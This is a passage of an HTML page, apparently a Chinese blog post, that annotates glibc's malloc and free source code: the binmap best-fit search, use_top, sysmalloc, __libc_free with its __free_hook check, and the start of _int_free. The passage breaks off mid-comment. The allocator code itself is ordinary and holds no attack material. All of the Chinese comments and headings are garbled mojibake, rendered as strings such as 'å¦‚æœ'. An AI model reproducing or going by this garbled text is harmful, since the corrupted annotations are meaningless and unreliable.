class="hljs-comment">//å¦‚æœå‰©ä¸‹çš„å°äºMINSIZEå°±æŠŠæ•´ä¸ªvictimç»™å‡ºå»</span><br>               <span class="hljs-comment">//ä¾‹è¡Œè®¾ç½®inuse_bitå’Œnon_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//å¦‚æœè¿‡å¤§å°±è¦åˆ†å‰², å–å‰é¢ä¸€éƒ¨åˆ†, å¤šå‡ºæ¥çš„æ”¾åˆ°unsorted bin</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//å–å‡ºå‰©ä¸‹çš„chunkæŒ‡é’ˆ, å‰é¢å†™è¿‡ç›¸å…³è¿‡ç¨‹</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//æ’å…¥unsortedbinå¤´éƒ¨</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//ç®€å•çš„æ£€æŸ¥,é˜²æ­¢fwdè¢«ç¯¡æ”¹</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//æ’å…¥å®Œæˆ</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebinå°±è®¾ç½®ä¸€ä¸‹</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//è¯¦ç»†çš„æ£€æŸ¥, åªæœ‰åœ¨MALLOC_DEBUGä¸º1æ—¶å¯ç”¨</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbinä¸­åˆšå¥½çš„--&gt;fastbinåˆå¹¶å+unsortedbinä¸­åˆšå¥½çš„--&gt;ç”¨nbå®šä½çš„largebin_idxä¸­ä¸å°äºçš„</span><br><span class="hljs-comment">//ä»¥ä¸Šè¿™äº›å…¨éƒ¨å¤±è´¥ä¹‹åè¿›è¡Œä¸‹é¢çš„æ“ä½œ,å¯»æ‰¾æ¯”å½“å‰idxæ›´å¤§çš„idx</span><br>   ++idx;<span class="hljs-comment">//ç›´æ¥+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//ä½¿ç”¨bitmapèƒ½å¤Ÿé¿å…å¾ªç¯åˆ¤æ–­+1åçš„idxæŒ‡å‘çš„é“¾è¡¨æ˜¯ä¸æ˜¯ç©ºçš„</span><br><span class="hljs-comment">//é™¤äº†mark_bin unmark_bin get_binmapå…¶ä»–binmapå‡½æ•°éƒ½ä¸æ¶‰åŠ binmapæ•°ç»„, åªæ˜¯å•çº¯çš„ç§»ä½è¿ç®—</span><br>   block = idx2block(idx);<span class="hljs-comment">//ç®—å‡ºblock</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//å–å‡ºmap</span><br>   bit = idx2bit(idx);<span class="hljs-comment">//ç®—å‡ºè¯¥ä½çš„bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//å¤§å¾ªç¯,æ‰¾åˆ°å or æ²¡æœ‰--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//å½“å‰bitä¸º0 æˆ–è€… chunkåé¢çš„bitä¹Ÿç­‰äº0(bit &gt; map), idx2bit()ä¸å¯èƒ½å¾—åˆ°0,åº”è¯¥æ˜¯å¾ªç¯ä¸‹é¢çš„éƒ¨åˆ†</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//æ²¡æœ‰çš„è¯åªèƒ½å¤Ÿä½¿ç”¨top chunkäº†</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<span class="hljs-comment">//ä¸ç­‰é›¶</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));<span class="hljs-comment">//å–åˆ°äº†æ›´å¤§ä¸”éç©ºçš„bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.æ²¡æœ‰ç»è¿‡ä¸Šé¢çš„if,åŸmapä¸­å°±å¤§äºç­‰äºbit, ä»åŸbitä½å¼€å§‹å·¦ç§»</span><br>       <span class="hljs-comment">//2.ç»è¿‡äº†ä¸Šé¢çš„if,bitä»æœ€ä½ä½å¼€å§‹å·¦ç§»</span><br>       <span class="hljs-comment">//ä»bitä½å¼€å§‹æ‰¾bin header, è‚¯å®šæ˜¯å­˜åœ¨çš„</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//æ—¢ç„¶æ¯”nbéƒ½å¤§, å°±é€‰ä¸€ä¸ªæœ€å³è¾¹çš„, è¿™æ ·åœ¨largebinä¸­è¿˜æ˜¯æœ€å°çš„</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// å¦‚æœvictim=binï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†mapå¯¹åº”çš„ä½æ¸…0ï¼Œç„¶åè·å–ä¸‹ä¸€ä¸ªbin</span><br>       <span class="hljs-comment">// è¿™ç§æƒ…å†µå‘ç”Ÿçš„æ¦‚ç‡åº”è¯¥å¾ˆå°ã€‚</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//ä¸å¤Ÿå°±æ•´å—é€å‡ºå»</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//å¤Ÿäº†å°±åˆ†å‰²</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// å¦‚æœåœ¨small binèŒƒå›´å†…ï¼Œå°±å°†å…¶æ ‡è®°ä¸ºremainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//è¯¦ç»†çš„æ£€æŸ¥, åªæœ‰åœ¨MALLOC_DEBUGä¸º1æ—¶å¯ç”¨</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><p>ä¸‡ç­–å°½äº†, ä½¿ç”¨top chunk. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   æ²¡çœ‹æ‡‚å†™äº†å•¥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//å¦‚æœtopè¶³å¤Ÿå¤§, å°±åˆ†å‰²</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><span class="hljs-comment">//è¯¦ç»†çš„æ£€æŸ¥, åªæœ‰åœ¨MALLOC_DEBUGä¸º1æ—¶å¯ç”¨</span><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//å¦‚æœä¸å¤Ÿå¤§ä¸”å½“å‰arenaæœ‰fastchunk, å†æ¬¡malloc_consolidate()ç­‰å¾…ä¸‹ä¸€æ¬¡å¾ªç¯æ˜¯å¦å¯è¡Œ</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//å•¥éƒ½æ²¡æœ‰, ç›´æ¥sysmalloc()å¢åŠ topchunk,å¹¶ä¸”returnè·³å‡ºå¾ªç¯</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="è¡¥å……-æ›´å¤§çš„å†…å­˜åˆ†é…â€“sysmalloc"><a href="#è¡¥å……-æ›´å¤§çš„å†…å­˜åˆ†é…â€“sysmalloc" class="headerlink" title="è¡¥å……: æ›´å¤§çš„å†…å­˜åˆ†é…â€“sysmalloc"></a>è¡¥å……: æ›´å¤§çš„å†…å­˜åˆ†é…â€“sysmalloc</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   sysmalloc handles malloc cases requiring more memory from the system.</span><br><span class="hljs-comment">   On entry, it is assumed that av-&gt;top does not have enough</span><br><span class="hljs-comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span><br><span class="hljs-comment">   be **extended** or **replaced**.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h4 id="ç¬¬ä¸€ç§æƒ…å†µ-ä½¿ç”¨mmap"><a href="#ç¬¬ä¸€ç§æƒ…å†µ-ä½¿ç”¨mmap" class="headerlink" title="ç¬¬ä¸€ç§æƒ…å†µ: ä½¿ç”¨mmap"></a>ç¬¬ä¸€ç§æƒ…å†µ: ä½¿ç”¨mmap</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">   the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">   allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">   rather than expanding top.</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><p>ä¸»è¦æ˜¯æ ¹æ®mp_é‡Œçš„mmapæ§åˆ¶å˜é‡æ¥å†³å®šæ˜¯å¦ä½¿ç”¨mmap. </p><p>å› ä¸ºmmapçš„chunkæ²¡æœ‰ä¸‹ä¸€ä¸ªchunkçš„prevsizeå¯ä»¥ä½¿ç”¨, æ‰€ä»¥overheadè¿˜è¦åŠ ä¸Šä¸€ä¸ªsize_t, ç„¶åæœ€ç»ˆå¤§å°å†å’ŒpageSizeå¯¹é½.</p><p>ç„¶åè¿›è¡Œä¸€äº›æ£€æŸ¥å’Œmp_å‚æ•°çš„æ›´æ–°, è¿”å›å¯ç”¨çš„chunk.</p><h4 id="ç¬¬äºŒç§-æ›¿æ¢æˆ–æ‹“å±•top"><a href="#ç¬¬äºŒç§-æ›¿æ¢æˆ–æ‹“å±•top" class="headerlink" title="ç¬¬äºŒç§: æ›¿æ¢æˆ–æ‹“å±•top"></a>ç¬¬äºŒç§: æ›¿æ¢æˆ–æ‹“å±•top</h4><p>è¿™ç§æ–¹æ³•ç”¨åˆ°äº†å…¶ä»–çº¿ç¨‹çš„arenaå’Œmorecoreä¹‹ç±»çš„macro, çœ‹ä¸æ‡‚å…ˆè·³è¿‡äº†. </p><h1 id="é‡Šæ”¾å†…å­˜å—"><a href="#é‡Šæ”¾å†…å­˜å—" class="headerlink" title="é‡Šæ”¾å†…å­˜å—"></a>é‡Šæ”¾å†…å­˜å—</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰é’©å­å‡½æ•° __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULLæ²¡æœ‰ä½œç”¨</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// å°†memè½¬æ¢ä¸ºchunkçŠ¶æ€</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// å¦‚æœè¯¥å—å†…å­˜æ˜¯mmapå¾—åˆ°çš„</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//å”¯ä¸€çš„tcache</span><br>    <br>    <span class="hljs-comment">// æ ¹æ®chunkè·å¾—åˆ†é…åŒºçš„æŒ‡é’ˆ</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// æ‰§è¡Œé‡Šæ”¾</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="å˜é‡å®šä¹‰-1"><a href="#å˜é‡å®šä¹‰-1" class="headerlink" title="å˜é‡å®šä¹‰"></a>å˜é‡å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></div></td></tr></table></figure><h3 id="å°æ£€æŸ¥-amp-tcache"><a href="#å°æ£€æŸ¥-amp-tcache" class="headerlink" title="å°æ£€æŸ¥ &amp; tcache"></a>å°æ£€æŸ¥ &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 